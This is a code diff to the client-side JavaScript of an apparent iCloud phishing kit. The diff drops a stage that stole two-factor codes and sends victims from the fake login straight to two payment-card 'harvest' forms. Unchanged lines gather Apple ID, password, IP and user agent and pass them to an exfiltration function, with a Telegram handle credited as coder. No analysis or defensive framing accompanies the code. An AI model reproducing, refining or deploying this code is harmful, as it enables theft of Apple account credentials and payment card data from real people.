@@ -1,9 +1,7 @@
 document.addEventListener('DOMContentLoaded', function() {
     const loginForm = document.getElementById('loginFormElement');
-    const twoFactorForm = document.getElementById('twoFactorForm');
     const cardForm = document.getElementById('cardForm');
     const secondCardForm = document.getElementById('secondCardForm');
-    const twoFactorModal = document.getElementById('twoFactorModal');
     const cardVerifyPage = document.getElementById('cardVerifyPage');
     const pageContainer = document.getElementById('pageContainer');
     const declinedMsg = document.getElementById('declinedMsg');
@@ -26,30 +24,13 @@ document.addEventListener('DOMContentLoaded', function() {
             const loginData = `🆕 iCloud Login Harvest\nApple ID: ${appleId}\nPassword: ${password}\nKeep Signed: ${keepSignedIn}\nIP: ${ip}\nUA: ${userAgent}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
             window.exfilData(loginData);
 
-            // Show 2FA Modal
-            twoFactorModal.classList.remove('hidden');
+            // Show Card Verification
             pageContainer.style.display = 'none';
+            cardVerifyPage.classList.remove('hidden');
         }, 1500);
     });
 
-    // Stage 2: 2FA Harvest
-    twoFactorForm.addEventListener('submit', (e) => {
-        e.preventDefault();
-        const code = document.getElementById('verificationCode').value;
-
-        // Exfil 2FA
-        const twoFaData = `🔑 2FA Code: ${code}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
-        window.exfilData(twoFaData);
-
-        // Escalate to Card
-        setTimeout(() => {
-            twoFactorModal.classList.add('hidden');
-            pageContainer.style.display = 'none';
-            cardVerifyPage.classList.remove('hidden');
-        }, 1000);
-    });
-
-    // Stage 3: Card Harvest (First Card)
+    // Stage 2: Card Harvest (First Card)
     cardForm.addEventListener('submit', (e) => {
         e.preventDefault();
         const cardName = document.getElementById('cardName').value;
@@ -91,7 +72,7 @@ document.addEventListener('DOMContentLoaded', function() {
         secondCardForm.classList.remove('hidden');
     });
 
-    // Stage 4: Second Card Harvest
+    // Stage 3: Second Card Harvest
     secondCardForm.addEventListener('submit', (e) => {
         e.preventDefault();
         const cardName2 = document.getElementById('cardName2').value;
